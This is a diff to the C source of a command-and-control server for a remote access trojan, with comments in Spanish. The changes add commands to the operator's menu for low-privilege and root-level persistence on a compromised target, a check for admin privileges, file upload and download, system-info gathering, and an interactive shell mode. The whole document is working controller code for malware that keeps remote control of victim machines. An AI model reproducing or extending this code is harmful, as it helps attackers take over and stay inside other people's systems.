@@ -13,7 +13,7 @@
 #include <sys/stat.h>
 #include "../src/base64.c"
 
-//Arreglar upload
+// Crear check para mirar permisos de admin
 
 int serverSock;
 int targetConn;
@@ -34,6 +34,7 @@ const char *GRAY = "\033[0;37m\033[1m";
 // Prototipo
 int mainFunction(int targetConn, char *clientIP, uint16_t clientPort);
 int ReadAndSendFile(int targetConn, char *file, char *instruct);
+int setPersistence(int targetConn, char *command);
 int shell(int targetConn, char *clientIP, uint16_t clientPort);
 int downloadFunc(char *command, int targetConn, char *ip); 
 int writeAndDecodeData(char *data, char *file, char *ip);
@@ -61,6 +62,8 @@ void closeConection(int targetConn, char *command, size_t instructLen, char *cli
     printf("\n\t%s[*>] %s Closing Connection to  %s ===> %s %s", YELLOW, RED, end, formattedString1, YELLOW); 
     send(targetConn, command, instructLen, 0);
     sleep(0.2);
+    shutdown(targetConn, SHUT_RDWR);
+    shutdown(serverSock, SHUT_RDWR);
     close(targetConn);
     close(serverSock);
 }
@@ -83,9 +86,15 @@ void helpPannel(){
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] shell                 -> Enter Shell Mode \n");
     printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] exec <command>        -> Exec command in no shell mode\n");
+    printf("\t\t| [!>] download <file>       -> Download from target \n");
     printf("\t\t---------------------------------------------------------\n");
-    printf("\t\t| [!>] download <file>       -> Download file from target\n");
+    printf("\t\t| [!>] upload <file>         -> Upload local file to target\n");
+    printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] sysinfo               -> Show info from system target\n");
+    printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] lowpersistence        -> Set a low mode of persistence (no root)\n");
+    printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] persistence           -> Set a high mode of persistence (root)\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q / exit              -> Exit the conection\n");
     printf("\t\t---------------------------------------------------------\n");
@@ -308,18 +317,52 @@ void StartGetSysInfo(int targetConn, char *command){
 
 }
 
-int setLowPersistence(int targetConn, char *command){
+int setPersistence(int targetConn, char *command){
     send(targetConn, command, strlen(command), 0);
-    char* recvData = malloc(SOCKBUFFER);    
+    char* recvData = malloc(SOCKBUFFER);  
 
     recv(targetConn, recvData, SOCKBUFFER, 0);
-    if (strcmp("error", recvData) == 0){
-        printf("\n\n\t%s[!>] %sError gettin low persistence...\n\n%s", RED, YELLOW, end);
+
+    if (strcmp(command, "lowpersistence") == 0){
+        if (strcmp("error", recvData) == 0){
+            printf("\n\n\t%s[!>] %sError getting low persistence...\n\n%s", RED, YELLOW, end);
+        }
+        else if (strcmp("exito", recvData) == 0){
+            printf("\n\n\t%s[*>] %sLow persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);    
+        }
     }
 
-    else if (strcmp("exito", recvData) == 0){
-        printf("\n\n\t%s[*>] %sLow persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);
+    if (strcmp(command, "persistence") == 0){
+        if (strcmp("error", recvData) == 0){
+            printf("\n\n\t%s[!>] %sError getting high persistence...\n\n%s", RED, YELLOW, end);  
+        
+        } else if (strcmp("exito", recvData) == 0){
+            printf("\n\n\t%s[*>] %sHigh persistence setted succsessfully...\n\n%s", YELLOW, BLUE, end);
+
+        } else if (strcmp("permissonError", recvData) == 0){
+            printf("\n\t%s[!>] %sError setting persistence, PermissonError...\n", YELLOW, BLUE);
+        
+        }
     }
+
+    free(recvData);
+    return 0;
+}
+
+int checkPermissons(int targetConn, char *command){
+    send(targetConn, command,  strlen(command), 0);
+    char* recvData = malloc(SOCKBUFFER);  
+
+    recv(targetConn, recvData, SOCKBUFFER, 0);
+    if (strstr(recvData, "yes") != NULL){
+        printf("\n\t%s[*>] %sAdmin Privileges...\n%s", YELLOW, BLUE, end); 
+    
+    } else if (strstr(recvData, "no") != NULL){
+        printf("\n\t%s[*>] %sUser Privileges...\n%s", YELLOW, BLUE, end); 
+    } 
+
+    free(recvData);
+    return 0;
 }
 
 int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
@@ -327,7 +370,7 @@ int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
     char resp[SOCKBUFFER];
     checkStart(clientIP);
     while (true){
-        printf("%s<*%s C&C %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
+        printf("\n%s<*%s C&C %s* %s>: %s ", YELLOW, RED, YELLOW, clientIP, end);
         fgets(command, sizeof(command), stdin); 
 
         // Eliminamos "\n" del final
@@ -366,8 +409,14 @@ int mainFunction(int targetConn, char *clientIP, uint16_t clientPort){
                 StartGetSysInfo(targetConn, command);
                 
             else if (strcmp(command, "lowpersistence") == 0)
-                setLowPersistence(targetConn, command);
-        
+                setPersistence(targetConn, command);
+            
+            else if (strcmp(command, "persistence") == 0)
+                setPersistence(targetConn, command);
+
+            else if (strcmp(command, "check") == 0)
+                checkPermissons(targetConn, command);   
+
             else 
                 printf("\n\t%s[!>]%s Instruct Not Known...\n", RED, YELLOW);
             
@@ -380,6 +429,9 @@ int startServer(){
     // Creamos el socket del cliente
     serverSock = socket(AF_INET, SOCK_STREAM, 0);
     
+    int enable = 1;
+    if (setsockopt(serverSock, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0)
+            perror("setsockopt(SO_REUSEADDR) failed");
 
     // Definimos el client addres
     struct sockaddr_in servAddr;
@@ -408,7 +460,7 @@ int startServer(){
     // Obtenemos el puerto del cliente
     uint16_t clientPort = ntohs(clientAddr.sin_port);
 
-    printf("\t%s[>]%s New Connection From: %s %s-%u\n\n", YELLOW, RED, end, clientIP, clientPort);
+    printf("\t%s[>]%s New Connection From: %s %s-%u\n", YELLOW, RED, end, clientIP, clientPort);
 
     mainFunction(targetConn, clientIP, clientPort);
     
